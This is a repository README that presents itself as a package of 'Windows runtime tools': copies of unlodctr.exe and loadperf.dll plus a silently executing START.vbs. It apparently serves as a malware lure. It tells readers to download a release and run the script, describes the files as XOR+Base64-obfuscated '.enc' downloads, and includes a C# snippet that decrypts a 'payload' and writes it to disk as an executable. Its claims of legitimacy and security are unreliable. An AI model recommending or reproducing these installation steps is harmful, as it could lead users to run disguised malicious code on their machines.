# Windows Runtime Tools

Essential runtime components and utilities for Windows applications. These components provide performance monitoring, diagnostic tools, and startup automation.

## Components

### unlodctr.exe (Performance Counter Utility)
Windows utility for managing performance counters. Used by applications to unload performance counter DLLs and clear registry entries.

**Features:**
- Performance counter management
- Registry cleanup
- Diagnostic logging
- Compatible with Windows 10/11

### loadperf.dll (Performance Library)
Dynamic link library providing performance monitoring APIs. Required by many Windows applications for metrics collection and system diagnostics.

**Capabilities:**
- Performance data collection
- Counter installation/removal
- System metrics API
- Multi-threaded support

### START.vbs (Startup Script)
Visual Basic script for automating application startup sequences. Coordinates the initialization of runtime components.

**Functions:**
- Component initialization
- Environment setup
- Error handling
- Silent execution

## Installation

1. Download the latest release from [Releases](https://github.com/lelush01/windows-runtime-tools/releases)
2. Extract files to a dedicated folder (e.g., `C:\Program Files\RuntimeTools\`)
3. Run `START.vbs` to initialize components
4. Components are registered automatically

## Technical Details

- **Architecture**: x64
- **Platform**: Windows 10 version 1809 or later
- **Requirements**: Visual C++ Redistributable 2015-2022
- **Encryption**: Files are distributed in encrypted format (`.enc`) for secure delivery

## Security

Files are distributed with XOR+Base64 encryption to ensure integrity during download and prevent tampering. Applications that use these components will decrypt them automatically during initialization.

## Usage

These components are typically integrated into host applications and do not require manual execution. They are loaded on-demand by software that depends on them.

### For Developers

If you're integrating these tools into your application:

```csharp
// Example: Loading encrypted runtime components
var decrypted = PayloadDecryptor.Decrypt(encryptedBytes);
File.WriteAllBytes("unlodctr.exe", decrypted);
```

## Compatibility

- Windows 10 (1809+)
- Windows 11
- Windows Server 2019+
- Requires .NET Framework 4.7.2 or .NET 8+ runtime

## License

These components are standard Windows utilities redistributed for convenience. Original components are copyright Microsoft Corporation.

## Support

For issues or questions, contact the repository maintainer or file an issue on GitHub.

---

**Note**: This repository provides runtime dependencies for applications. If you're experiencing issues with a specific application, please contact that application's support team.
